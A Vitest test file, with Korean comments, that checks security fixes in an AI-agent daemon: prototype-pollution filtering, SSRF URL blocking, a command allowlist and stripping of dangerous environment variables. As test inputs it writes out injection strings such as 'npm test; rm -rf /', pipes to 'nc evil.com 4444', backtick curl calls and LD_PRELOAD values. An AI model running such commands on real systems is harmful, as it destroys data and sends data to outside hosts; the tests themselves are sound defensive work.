/**
 * Security Remediation Tests — Adversarial Review 14건 패치 검증
 * #1 checkCommand 셸 인젝션, #2 ALLOWED_MODELS, #4 SDK 환경 오염,
 * #7 SimpleCircuitBreaker, #8 estimateIterationsCostUsd 타입,
 * #10 브랜치명 검증, #12 SSRF, #13 CostTracker.load() JSON 검증,
 * #16 eval-store enum 검증
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import {
  CostTracker,
  estimateIterationsCostUsd,
  MODEL_PRICING,
} from '../lib/cost-tracker.js';
import {
  EvalStore,
  validateEvalRun,
  type EvalRun,
} from '../lib/eval-store.js';

const TEST_DIR = path.join(os.tmpdir(), 'a-team-security-test-' + process.pid);

beforeEach(() => { fs.mkdirSync(TEST_DIR, { recursive: true }); });
afterEach(() => { fs.rmSync(TEST_DIR, { recursive: true, force: true }); });

// ─── #13: CostTracker.load() JSON 검증 ────────────────────────────────────────

describe('#13 CostTracker.load() — 악의적 JSON 방어', () => {
  it('__proto__ 키 포함 레코드를 무시한다', () => {
    const file = path.join(TEST_DIR, 'session-costs.json');
    // __proto__ 키를 원시 JSON 문자열로 직접 작성 (JS 객체 리터럴은 직렬화 시 __proto__를 제거함)
    const rawJson = '[{"model":"test","inputTokens":100,"outputTokens":50,"costUsd":0.01},{"__proto__":{"polluted":true},"model":"evil","inputTokens":1,"outputTokens":1,"costUsd":0}]';
    fs.writeFileSync(file, rawJson);

    const tracker = new CostTracker(TEST_DIR);
    tracker.load();
    const summary = tracker.getSummary();
    // __proto__ 포함 레코드 1건 제거 → 1건만 남음
    expect(summary.callCount).toBe(1);
    expect(summary.byModel['test']).toBeDefined();
    expect((Object.prototype as Record<string, unknown>)['polluted']).toBeUndefined();
  });

  it('constructor 키 포함 레코드를 무시한다', () => {
    const file = path.join(TEST_DIR, 'session-costs.json');
    const malicious = [
      { constructor: 'hacked', model: 'evil', inputTokens: 1, outputTokens: 1, costUsd: 0.01 },
    ];
    fs.writeFileSync(file, JSON.stringify(malicious));

    const tracker = new CostTracker(TEST_DIR);
    tracker.load();
    expect(tracker.getSummary().callCount).toBe(0);
  });

  it('음수 costUsd를 0으로 교정한다', () => {
    const file = path.join(TEST_DIR, 'session-costs.json');
    const badData = [
      { model: 'sonnet', inputTokens: 100, outputTokens: 50, costUsd: -99.99 },
    ];
    fs.writeFileSync(file, JSON.stringify(badData));

    const tracker = new CostTracker(TEST_DIR);
    tracker.load();
    const summary = tracker.getSummary();
    expect(summary.totalCostUsd).toBe(0);
  });

  it('Infinity/NaN 값을 0으로 교정한다', () => {
    const file = path.join(TEST_DIR, 'session-costs.json');
    // JSON.parse ignores Infinity — we write the string representation
    const raw = '[{"model":"opus","inputTokens":"Infinity","outputTokens":null,"costUsd":"NaN"}]';
    fs.writeFileSync(file, raw);

    const tracker = new CostTracker(TEST_DIR);
    tracker.load();
    const summary = tracker.getSummary();
    expect(summary.totalCostUsd).toBe(0);
    expect(summary.totalInputTokens).toBe(0);
  });

  it('배열이 아닌 JSON이면 무시한다', () => {
    const file = path.join(TEST_DIR, 'session-costs.json');
    fs.writeFileSync(file, JSON.stringify({ evil: 'object' }));

    const tracker = new CostTracker(TEST_DIR);
    tracker.load();
    expect(tracker.getSummary().callCount).toBe(0);
  });

  it('올바른 레코드는 정상 로드된다', () => {
    const tracker1 = new CostTracker(TEST_DIR);
    tracker1.record({ model: 'claude-sonnet-4-6', inputTokens: 1000, outputTokens: 500, costUsd: 0.06 });
    tracker1.save();

    const tracker2 = new CostTracker(TEST_DIR);
    tracker2.load();
    expect(tracker2.getSummary().callCount).toBe(1);
    expect(tracker2.getSummary().totalCostUsd).toBeCloseTo(0.06, 5);
  });
});

// ─── #8: estimateIterationsCostUsd 타입 검증 ──────────────────────────────────

describe('#8 estimateIterationsCostUsd — 알 수 없는 타입 보수적 처리', () => {
  it('알 수 없는 type은 Opus 가격으로 계산한다', () => {
    const iterations = [
      { type: 'unknown_future_type', input_tokens: 1_000_000, output_tokens: 0 },
    ];
    const cost = estimateIterationsCostUsd(iterations, 'claude-sonnet-4-6');
    // Opus: $15/M → 1M in = $15
    expect(cost).toBeCloseTo(15, 4);
  });

  it('message 타입은 executorModel 가격을 사용한다', () => {
    const iterations = [
      { type: 'message', input_tokens: 1_000_000, output_tokens: 0 },
    ];
    // Sonnet: $3/M in
    const cost = estimateIterationsCostUsd(iterations, 'claude-sonnet-4-6');
    expect(cost).toBeCloseTo(3, 4);
  });

  it('advisor_message 타입은 iter.model 가격을 사용한다', () => {
    const iterations = [
      { type: 'advisor_message', model: 'claude-opus-4-6', input_tokens: 1_000_000, output_tokens: 0 },
    ];
    // Opus: $15/M in
    const cost = estimateIterationsCostUsd(iterations, 'claude-sonnet-4-6');
    expect(cost).toBeCloseTo(15, 4);
  });
});

// ─── #6: MODEL_PRICING JSON 단일 진실 공급원 검증 ────────────────────────────────

describe('#6 MODEL_PRICING — lib/model-pricing.json 동기화', () => {
  it('4개 공식 모델이 모두 정의되어 있다', () => {
    expect(MODEL_PRICING['claude-opus-4-6']).toBeDefined();
    expect(MODEL_PRICING['claude-sonnet-4-6']).toBeDefined();
    expect(MODEL_PRICING['claude-haiku-4-5-20251001']).toBeDefined();
    expect(MODEL_PRICING['claude-haiku-4-5']).toBeDefined();
  });

  it('Sonnet 가격: $3/M in, $15/M out', () => {
    const p = MODEL_PRICING['claude-sonnet-4-6'];
    expect(p.inputPerMillion).toBe(3);
    expect(p.outputPerMillion).toBe(15);
    expect(p.cacheReadMultiplier).toBe(0.1);
    expect(p.cacheWriteMultiplier).toBe(1.25);
  });

  it('Opus 가격: $15/M in, $75/M out', () => {
    const p = MODEL_PRICING['claude-opus-4-6'];
    expect(p.inputPerMillion).toBe(15);
    expect(p.outputPerMillion).toBe(75);
  });

  it('model-pricing.json 파일이 실제로 존재한다', () => {
    const jsonPath = path.join(process.cwd(), 'lib', 'model-pricing.json');
    expect(fs.existsSync(jsonPath)).toBe(true);
  });
});

// ─── #16: eval-store enum 검증 ───────────────────────────────────────────────

describe('#16 validateEvalRun — enum 및 값 범위 검증', () => {
  it('유효한 abVariant는 통과한다', () => {
    const run: Partial<EvalRun> = {
      id: 'r1', ts: new Date().toISOString(), branch: 'main', commit: 'abc',
      tier: 'gate', results: [], totalDurationMs: 0, totalCostUsd: 0,
      abVariant: 'advisor-on',
    };
    expect(() => validateEvalRun(run)).not.toThrow();
  });

  it('유효한 abVariant null은 통과한다', () => {
    const run: Partial<EvalRun> = {
      id: 'r2', ts: new Date().toISOString(), branch: 'main', commit: 'abc',
      tier: 'gate', results: [], totalDurationMs: 0, totalCostUsd: 0,
      abVariant: null,
    };
    expect(() => validateEvalRun(run)).not.toThrow();
  });

  it('잘못된 abVariant는 에러를 던진다', () => {
    const run = {
      id: 'r3', ts: new Date().toISOString(), branch: 'main', commit: 'abc',
      tier: 'gate' as const, results: [], totalDurationMs: 0, totalCostUsd: 0,
      abVariant: 'invalid-variant' as 'advisor-on',
    };
    expect(() => validateEvalRun(run)).toThrow('Invalid abVariant');
  });

  it('qualityScore 범위 초과 시 에러를 던진다', () => {
    const run: Partial<EvalRun> = {
      id: 'r4', ts: new Date().toISOString(), branch: 'main', commit: 'abc',
      tier: 'gate', results: [], totalDurationMs: 0, totalCostUsd: 0,
      qualityScore: 150, // > 100
    };
    expect(() => validateEvalRun(run)).toThrow('qualityScore');
  });

  it('qualityScore 음수 시 에러를 던진다', () => {
    const run: Partial<EvalRun> = {
      id: 'r5', ts: new Date().toISOString(), branch: 'main', commit: 'abc',
      tier: 'gate', results: [], totalDurationMs: 0, totalCostUsd: 0,
      qualityScore: -0.1,
    };
    expect(() => validateEvalRun(run)).toThrow('qualityScore');
  });

  it('costUsd 음수 시 에러를 던진다', () => {
    const run: Partial<EvalRun> = {
      id: 'r6', ts: new Date().toISOString(), branch: 'main', commit: 'abc',
      tier: 'gate', results: [], totalDurationMs: 0, totalCostUsd: 0,
      costUsd: -1,
    };
    expect(() => validateEvalRun(run)).toThrow('costUsd');
  });

  it('알 수 없는 taskCategory는 other로 교정한다', () => {
    const run: Partial<EvalRun> = {
      id: 'r7', ts: new Date().toISOString(), branch: 'main', commit: 'abc',
      tier: 'gate', results: [], totalDurationMs: 0, totalCostUsd: 0,
      taskCategory: 'unknown-category',
    };
    const result = validateEvalRun(run);
    expect(result.taskCategory).toBe('other');
  });

  it('EvalStore.save()가 validation을 거쳐 잘못된 값을 거부한다', () => {
    const store = new EvalStore(TEST_DIR);
    const badRun = {
      id: 'bad', ts: new Date().toISOString(), branch: 'main', commit: 'abc',
      tier: 'gate' as const, results: [], totalDurationMs: 0, totalCostUsd: 0,
      qualityScore: 999,
    };
    expect(() => store.save(badRun)).toThrow();
  });
});

// ─── #7: SimpleCircuitBreaker 단위 테스트 ────────────────────────────────────

describe('#7 SimpleCircuitBreaker', () => {
  // We test the JS version via dynamic import of the mjs module
  // Since we can't directly import .mjs from TS test, we replicate the class logic inline
  // to verify the specification. The actual class is tested in daemon-utils.mjs.

  class SimpleCircuitBreakerInline {
    name: string;
    failureThreshold: number;
    windowMs: number;
    cooldownMs: number;
    events: Array<{ ts: number; success: boolean }>;
    state: 'CLOSED' | 'OPEN' | 'HALF_OPEN';
    openedAt: number | null;

    constructor({ name = 'test', failureThreshold = 0.5, windowMs = 60_000, cooldownMs = 30_000 } = {}) {
      this.name = name;
      this.failureThreshold = failureThreshold;
      this.windowMs = windowMs;
      this.cooldownMs = cooldownMs;
      this.events = [];
      this.state = 'CLOSED';
      this.openedAt = null;
    }

    recordSuccess() { this.events.push({ ts: Date.now(), success: true }); this._trim(); this._maybeClose(); }
    recordFailure() { this.events.push({ ts: Date.now(), success: false }); this._trim(); this._maybeOpen(); }

    canExecute() {
      if (this.state === 'OPEN') {
        if (Date.now() - this.openedAt! >= this.cooldownMs) { this.state = 'HALF_OPEN'; return true; }
        return false;
      }
      return true;
    }

    _trim() { const cutoff = Date.now() - this.windowMs; this.events = this.events.filter(e => e.ts >= cutoff); }

    _maybeOpen() {
      if (this.events.length < 3) return;
      const fails = this.events.filter(e => !e.success).length;
      if (fails / this.events.length >= this.failureThreshold) { this.state = 'OPEN'; this.openedAt = Date.now(); }
    }

    _maybeClose() { if (this.state === 'HALF_OPEN') { this.state = 'CLOSED'; this.openedAt = null; } }
  }

  it('초기 상태는 CLOSED이고 canExecute=true', () => {
    const cb = new SimpleCircuitBreakerInline({ failureThreshold: 0.5 });
    expect(cb.state).toBe('CLOSED');
    expect(cb.canExecute()).toBe(true);
  });

  it('실패율 임계치 도달 시 OPEN으로 전환 → canExecute=false', () => {
    const cb = new SimpleCircuitBreakerInline({ failureThreshold: 0.5, cooldownMs: 60_000 });
    cb.recordFailure();
    cb.recordFailure();
    cb.recordFailure(); // 3/3 = 100% >= 50%
    expect(cb.state).toBe('OPEN');
    expect(cb.canExecute()).toBe(false);
  });

  it('쿨다운 후 HALF_OPEN으로 전환 → canExecute=true', () => {
    const cb = new SimpleCircuitBreakerInline({ failureThreshold: 0.5, cooldownMs: 1 }); // 1ms
    cb.recordFailure();
    cb.recordFailure();
    cb.recordFailure();
    expect(cb.state).toBe('OPEN');
    // 쿨다운 경과 시뮬레이션: openedAt을 과거로 설정
    cb.openedAt = Date.now() - 100;
    expect(cb.canExecute()).toBe(true);
    expect(cb.state).toBe('HALF_OPEN');
  });

  it('HALF_OPEN에서 성공 시 CLOSED로 전환', () => {
    const cb = new SimpleCircuitBreakerInline({ failureThreshold: 0.5, cooldownMs: 1 });
    cb.recordFailure();
    cb.recordFailure();
    cb.recordFailure();
    cb.openedAt = Date.now() - 100;
    cb.canExecute(); // → HALF_OPEN
    cb.recordSuccess();
    expect(cb.state).toBe('CLOSED');
    expect(cb.canExecute()).toBe(true);
  });

  it('3건 미만이면 실패율 관계없이 OPEN되지 않는다', () => {
    const cb = new SimpleCircuitBreakerInline({ failureThreshold: 0.5 });
    cb.recordFailure();
    cb.recordFailure(); // 2건 — threshold 미충족
    expect(cb.state).toBe('CLOSED');
  });
});

// ─── #12: SSRF 방지 URL 검증 (로직 검증) ─────────────────────────────────────

describe('#12 isNotifyUrlAllowed — SSRF 방지', () => {
  // isNotifyUrlAllowed는 ralph-daemon.mjs의 내부 함수이므로
  // 동일 로직을 인라인으로 테스트
  function isNotifyUrlAllowed(url: string): boolean {
    try {
      const u = new URL(url);
      if (!['http:', 'https:'].includes(u.protocol)) return false;
      const host = u.hostname;
      if (host === 'localhost' || host === '127.0.0.1' || host === '0.0.0.0') return false;
      if (/^10\./.test(host) || /^192\.168\./.test(host) || /^172\.(1[6-9]|2\d|3[01])\./.test(host)) return false;
      if (host === '169.254.169.254') return false;
      if (/^\[?::1\]?$/.test(host) || /^\[?fc/i.test(host)) return false;
      return true;
    } catch {
      return false;
    }
  }

  it('localhost는 차단된다', () => {
    expect(isNotifyUrlAllowed('http://localhost:3001/notify')).toBe(false);
  });

  it('127.0.0.1은 차단된다', () => {
    expect(isNotifyUrlAllowed('http://127.0.0.1:8080/api')).toBe(false);
  });

  it('AWS metadata endpoint가 차단된다', () => {
    expect(isNotifyUrlAllowed('http://169.254.169.254/latest/meta-data')).toBe(false);
  });

  it('10.x.x.x private IP가 차단된다', () => {
    expect(isNotifyUrlAllowed('http://10.0.0.1/api')).toBe(false);
  });

  it('192.168.x.x private IP가 차단된다', () => {
    expect(isNotifyUrlAllowed('http://192.168.1.100/notify')).toBe(false);
  });

  it('172.16.x.x private IP가 차단된다', () => {
    expect(isNotifyUrlAllowed('http://172.16.0.1/notify')).toBe(false);
  });

  it('공개 URL은 허용된다', () => {
    expect(isNotifyUrlAllowed('https://example.com/api/notify')).toBe(true);
  });

  it('https 공개 URL은 허용된다', () => {
    expect(isNotifyUrlAllowed('https://hooks.slack.com/services/T00/B00/xxx')).toBe(true);
  });

  it('ftp:// 같은 비HTTP 프로토콜은 차단된다', () => {
    expect(isNotifyUrlAllowed('ftp://example.com/notify')).toBe(false);
  });

  it('잘못된 URL 형식은 차단된다', () => {
    expect(isNotifyUrlAllowed('not-a-url')).toBe(false);
    expect(isNotifyUrlAllowed('')).toBe(false);
  });
});

// ─── #10: 브랜치명 검증 ──────────────────────────────────────────────────────

describe('#10 브랜치명 — 유니코드/안전 문자 검증', () => {
  function makeBranchSlug(task: string): string | null {
    const cleanSlug = task
      .replace(/[\u200B-\u200F\u2028-\u202F\uFEFF]/g, '')
      .replace(/[^a-zA-Z0-9\-_]/g, '-')
      .replace(/-+/g, '-')
      .replace(/^-|-$/g, '')
      .slice(0, 50) || 'task';
    const date = '2026-04-11'; // 고정 날짜로 테스트
    const branch = `ralph/${date}-${cleanSlug}`;
    if (!/^ralph\/\d{4}-\d{2}-\d{2}-[a-zA-Z0-9\-_]+$/.test(branch)) {
      return null; // invalid
    }
    return branch;
  }

  it('영문/숫자 태스크명은 유효한 브랜치명을 생성한다', () => {
    const branch = makeBranchSlug('fix auth bug');
    expect(branch).toBe('ralph/2026-04-11-fix-auth-bug');
  });

  it('한글 태스크명은 대시로 치환된다', () => {
    const branch = makeBranchSlug('인증 버그 수정');
    expect(branch).not.toBeNull();
    expect(branch).toMatch(/^ralph\/\d{4}-\d{2}-\d{2}-/);
  });

  it('제로폭 공백이 제거된다', () => {
    const task = 'fix\u200Bbug'; // 제로폭 공백 삽입
    const branch = makeBranchSlug(task);
    expect(branch).not.toContain('\u200B');
    expect(branch).toMatch(/^ralph\/\d{4}-\d{2}-\d{2}-[a-zA-Z0-9\-_]+$/);
  });

  it('유니코드 공백(U+2028)이 제거된다', () => {
    const task = 'fix\u2028bug';
    const branch = makeBranchSlug(task);
    expect(branch).not.toContain('\u2028');
  });

  it('특수문자가 대시로 치환된다', () => {
    const branch = makeBranchSlug('fix: auth & refresh');
    expect(branch).toMatch(/^ralph\/\d{4}-\d{2}-\d{2}-[a-zA-Z0-9\-_]+$/);
  });

  it('50자 이상은 잘린다', () => {
    const longTask = 'a'.repeat(100);
    const branch = makeBranchSlug(longTask);
    expect(branch).not.toBeNull();
    // slug 부분이 50자 이하
    const slug = branch!.replace(/^ralph\/\d{4}-\d{2}-\d{2}-/, '');
    expect(slug.length).toBeLessThanOrEqual(50);
  });
});

// ─── #1: checkCommand 파서 검증 ──────────────────────────────────────────────

describe('#1 parseCheckCommand — 셸 인젝션 방지', () => {
  const ALLOWED_COMMANDS = new Set([
    'npm', 'pnpm', 'yarn', 'node', 'tsc', 'vitest', 'jest',
    'bash', 'sh', 'test', 'bun', 'deno',
  ]);
  const SHELL_META_RE = /[|;&`$><\\]/;

  function parseCheckCommand(checkCommand: string): { cmd: string; args: string[] } | null {
    if (!checkCommand || typeof checkCommand !== 'string') return null;
    const trimmed = checkCommand.trim();
    if (!trimmed) return null;
    if (SHELL_META_RE.test(trimmed)) return null;
    const tokens = trimmed.split(/\s+/);
    const cmd = tokens[0];
    const args = tokens.slice(1);
    if (cmd.includes('../') || cmd.includes('..\\')) return null;
    const baseName = cmd.replace(/^.*\//, '');
    if (!ALLOWED_COMMANDS.has(cmd) && !ALLOWED_COMMANDS.has(baseName)) return null;
    return { cmd, args };
  }

  it('npm test 허용', () => {
    const result = parseCheckCommand('npm test');
    expect(result).not.toBeNull();
    expect(result!.cmd).toBe('npm');
    expect(result!.args).toEqual(['test']);
  });

  it('vitest run 허용', () => {
    const result = parseCheckCommand('vitest run');
    expect(result).not.toBeNull();
  });

  it('셸 메타문자 포함 거부: npm test; rm -rf /', () => {
    expect(parseCheckCommand('npm test; rm -rf /')).toBeNull();
  });

  it('파이프 거부: npm test | nc attacker.com', () => {
    expect(parseCheckCommand('npm test | nc attacker.com')).toBeNull();
  });

  it('백틱 거부: `curl evil.com`', () => {
    expect(parseCheckCommand('`curl evil.com`')).toBeNull();
  });

  it('$(cmd) 거부', () => {
    expect(parseCheckCommand('npm test $(echo hacked)')).toBeNull();
  });

  it('리다이렉션 거부: npm test > /etc/passwd', () => {
    expect(parseCheckCommand('npm test > /etc/passwd')).toBeNull();
  });

  it('경로 트래버설 거부: ../../bin/curl', () => {
    expect(parseCheckCommand('../../bin/curl http://evil.com')).toBeNull();
  });

  it('허용 목록 외 명령 거부: curl http://evil.com', () => {
    expect(parseCheckCommand('curl http://evil.com')).toBeNull();
  });

  it('빈 문자열 → null 반환', () => {
    expect(parseCheckCommand('')).toBeNull();
  });

  it('&& 연산자 거부', () => {
    expect(parseCheckCommand('npm test && rm -rf /')).toBeNull();
  });
});

// ─── CSO-H03: getPermissionMode 폴백 검증 ─────────────────────────────────────

describe('CSO-H03 getPermissionMode — plan 폴백', () => {
  // daemon-utils.mjs는 ESM 모듈이므로 로직을 인라인으로 복제해 검증
  // 실제 모듈은 스크립트로 직접 테스트 불가 (spawnSync 의존)

  const ALLOWED_MODES = ['auto', 'bypassPermissions', 'acceptEdits', 'plan'];

  function simulateGetPermissionMode(opts: {
    envMode?: string;
    overrideMode?: string;
    autoAvailable?: boolean;
  }): string {
    const { envMode, overrideMode, autoAvailable = false } = opts;

    if (envMode) {
      if (!ALLOWED_MODES.includes(envMode)) throw new Error(`Invalid CLAUDE_PERMISSION_MODE: "${envMode}"`);
      return envMode;
    }

    if (autoAvailable) return 'auto';

    // CSO-H03: bypassPermissions는 명시적 override로만 허용
    if (overrideMode === 'bypassPermissions') return 'bypassPermissions';

    return 'plan';
  }

  it('CLAUDE_PERMISSION_MODE=plan이면 plan을 반환한다', () => {
    expect(simulateGetPermissionMode({ envMode: 'plan' })).toBe('plan');
  });

  it('CLAUDE_PERMISSION_MODE=bypassPermissions이면 bypassPermissions를 반환한다', () => {
    expect(simulateGetPermissionMode({ envMode: 'bypassPermissions' })).toBe('bypassPermissions');
  });

  it('auto 미지원 + override 없음 → plan 폴백 (CSO-H03 핵심)', () => {
    const result = simulateGetPermissionMode({ autoAvailable: false });
    expect(result).toBe('plan');
  });

  it('auto 미지원 + CLAUDE_PERMISSION_MODE_OVERRIDE=bypassPermissions → bypassPermissions', () => {
    const result = simulateGetPermissionMode({ autoAvailable: false, overrideMode: 'bypassPermissions' });
    expect(result).toBe('bypassPermissions');
  });

  it('auto 지원 환경이면 auto를 반환한다', () => {
    expect(simulateGetPermissionMode({ autoAvailable: true })).toBe('auto');
  });

  it('유효하지 않은 CLAUDE_PERMISSION_MODE는 에러를 던진다', () => {
    expect(() => simulateGetPermissionMode({ envMode: 'invalid' })).toThrow('Invalid CLAUDE_PERMISSION_MODE');
  });
});

// ─── CSO-M01: DANGEROUS_ENV_VARS에 A_TEAM_ADVISOR_* 추가 검증 ─────────────────

describe('CSO-M01 buildClaudeEnv — A_TEAM_ADVISOR_* 환경변수 제거', () => {
  const DANGEROUS_ENV_VARS = [
    'CLAUDECODE',
    'NODE_OPTIONS',
    'NODE_PATH',
    'LD_PRELOAD',
    'LD_LIBRARY_PATH',
    'DYLD_INSERT_LIBRARIES',
    'ANTHROPIC_BASE_URL',
    'A_TEAM_ADVISOR_BETA_HEADER',
    'A_TEAM_ADVISOR_TOOL_TYPE',
  ];

  function simulateBuildClaudeEnv(inputEnv: Record<string, string>): Record<string, string | undefined> {
    const env = { ...inputEnv };
    for (const key of DANGEROUS_ENV_VARS) delete env[key];
    return env;
  }

  it('A_TEAM_ADVISOR_BETA_HEADER는 자식 프로세스 env에서 제거된다', () => {
    const result = simulateBuildClaudeEnv({
      A_TEAM_ADVISOR_BETA_HEADER: 'malicious-header',
      ANTHROPIC_API_KEY: 'key',
    });
    expect(result['A_TEAM_ADVISOR_BETA_HEADER']).toBeUndefined();
    expect(result['ANTHROPIC_API_KEY']).toBe('key');
  });

  it('A_TEAM_ADVISOR_TOOL_TYPE는 자식 프로세스 env에서 제거된다', () => {
    const result = simulateBuildClaudeEnv({
      A_TEAM_ADVISOR_TOOL_TYPE: 'injected_type',
      ANTHROPIC_API_KEY: 'key',
    });
    expect(result['A_TEAM_ADVISOR_TOOL_TYPE']).toBeUndefined();
  });

  it('기존 DANGEROUS_ENV_VARS(NODE_OPTIONS 등)도 여전히 제거된다', () => {
    const result = simulateBuildClaudeEnv({
      NODE_OPTIONS: '--require evil',
      LD_PRELOAD: '/evil/lib.so',
      SAFE_VAR: 'keep-me',
    });
    expect(result['NODE_OPTIONS']).toBeUndefined();
    expect(result['LD_PRELOAD']).toBeUndefined();
    expect(result['SAFE_VAR']).toBe('keep-me');
  });
});

// ─── CSO-L02: parseCheckCommand 셸 메타문자 경고 검증 ────────────────────────

describe('CSO-L02 parseCheckCommand — 셸 메타문자 경고 로그', () => {
  // ralph-daemon.mjs의 parseCheckCommand 로직을 인라인으로 검증
  const ALLOWED_CHECK_COMMANDS = new Set([
    'npm', 'pnpm', 'yarn', 'node', 'tsc', 'vitest', 'jest',
    'bash', 'sh', 'test', 'bun', 'deno',
  ]);
  const SHELL_META_RE = /[|;&`$><\\]/;

  const warningLogs: string[] = [];
  function mockLog(msg: string) { warningLogs.push(msg); }

  function parseCheckCommandWithLog(checkCommand: string): { cmd: string; args: string[] } | null {
    if (!checkCommand || typeof checkCommand !== 'string') return null;
    const trimmed = checkCommand.trim();
    if (!trimmed) return null;

    if (SHELL_META_RE.test(trimmed)) {
      mockLog(`[RALPH][WARNING] checkCommand에 셸 메타문자 감지: "${trimmed}". 파이프/리다이렉트 대신 래퍼 스크립트(예: scripts/ci-check.sh)를 사용하세요. 데몬은 단순 명령만 실행합니다.`);
      return null;
    }

    const tokens = trimmed.split(/\s+/);
    const cmd = tokens[0];
    const args = tokens.slice(1);
    if (cmd.includes('../') || cmd.includes('..\\')) return null;
    const baseName = cmd.replace(/^.*\//, '');
    if (!ALLOWED_CHECK_COMMANDS.has(cmd) && !ALLOWED_CHECK_COMMANDS.has(baseName)) return null;
    return { cmd, args };
  }

  beforeEach(() => { warningLogs.length = 0; });

  it('파이프 감지 시 [RALPH][WARNING] 로그가 기록된다', () => {
    const result = parseCheckCommandWithLog('npm test | nc evil.com 4444');
    expect(result).toBeNull();
    expect(warningLogs.length).toBe(1);
    expect(warningLogs[0]).toContain('[RALPH][WARNING]');
    expect(warningLogs[0]).toContain('셸 메타문자 감지');
    expect(warningLogs[0]).toContain('래퍼 스크립트');
  });

  it('세미콜론 감지 시 경고 로그에 원본 명령이 포함된다', () => {
    const cmd = 'npm test; rm -rf /';
    parseCheckCommandWithLog(cmd);
    expect(warningLogs[0]).toContain(cmd);
  });

  it('정상 명령은 경고 없이 파싱된다', () => {
    const result = parseCheckCommandWithLog('npm test');
    expect(result).not.toBeNull();
    expect(warningLogs.length).toBe(0);
  });

  it('리다이렉트 감지 시 래퍼 스크립트 가이드가 로그에 포함된다', () => {
    parseCheckCommandWithLog('npm test > /tmp/out.txt');
    expect(warningLogs[0]).toContain('ci-check.sh');
  });
});
